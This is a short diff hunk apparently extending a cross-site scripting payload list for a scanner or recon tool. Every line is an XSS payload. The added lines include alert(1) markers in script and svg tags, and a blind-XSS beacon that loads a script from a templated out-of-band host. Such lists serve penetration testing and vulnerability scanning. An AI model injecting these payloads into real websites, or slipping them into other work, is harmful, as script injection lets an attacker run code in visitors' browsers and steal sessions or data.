@@ -66,3 +66,8 @@ onerror=eval;throw'=alert\x28document\x2edomain\x29';
 "><img src=x onerror=alert(1)> 
 <img src=xss onerror=alert(1)> 
 <svg onload=alert(hi)>
+# Reviewed local browser markers and a typed, runtime-bound Collaborator beacon.
+<script>alert(1)</script>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+"><script src=//{{RECON_OAST_HOST}}/rh.js></script>
